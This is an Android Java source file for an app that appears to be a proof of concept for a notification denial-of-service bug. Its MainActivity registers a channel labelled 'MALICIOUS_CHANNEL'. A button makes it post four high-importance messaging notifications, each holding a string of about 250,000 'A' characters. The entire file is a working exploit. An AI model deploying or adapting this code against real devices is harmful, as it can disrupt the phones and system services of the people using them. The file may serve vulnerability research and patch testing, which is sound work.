package dev.virtualpatch.longnotificationdos;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.NotificationCompat;

import android.annotation.SuppressLint;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Person;
import android.os.Bundle;
import android.util.Log;

import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.Date;

public class MainActivity extends AppCompatActivity {

    String id = "MALICIOUS_CHANNEL";
    CharSequence name = "MALICIOUS_CHANNEL_NAME";
    String description = "MALICIOUS_CHANNEL_DESCR";
    NotificationManager notificationManager = null;

    int num = 0;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        createNotificationChannel();

        findViewById(R.id.senderBtn).setOnClickListener(view -> exploit());
    }

    private void exploit() {
        for (int i = 0; i < 4; i++) {
            Log.i("MALICIOUS", "Sending notification: " + num);
            exploit("Username", buildLongString(1024 * 250));
            try {
                Thread.sleep(1000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }

        }
    }

    private void exploit(CharSequence userName, CharSequence text) {
        CharSequence title = "Title";
        CharSequence subject = "Subject";

        Person user = new Person.Builder().setName(userName).build();
        Notification.MessagingStyle style = new Notification.MessagingStyle(user)
                .addMessage(text, new Date().getTime(), user);


        Notification noti = new Notification.Builder(this, id)
                .setContentTitle(title)
                .setContentText(subject)
                .setSmallIcon(R.drawable.ic_launcher_background)
                .setStyle(style)
                .build();

        notificationManager.notify(num, noti);
        num++;
    }

    private String buildLongString(int len) {
        StringBuilder sb = new StringBuilder();

        for (int i = 0; i < len; i++) {
            sb.append("A");
        }

        return sb.toString();
    }

    private void createNotificationChannel() {
        int importance = NotificationManager.IMPORTANCE_HIGH;

        NotificationChannel channel = new NotificationChannel(id, name, importance);
        channel.setDescription(description);
        notificationManager = getSystemService(NotificationManager.class);

        notificationManager.createNotificationChannel(channel);
    }

}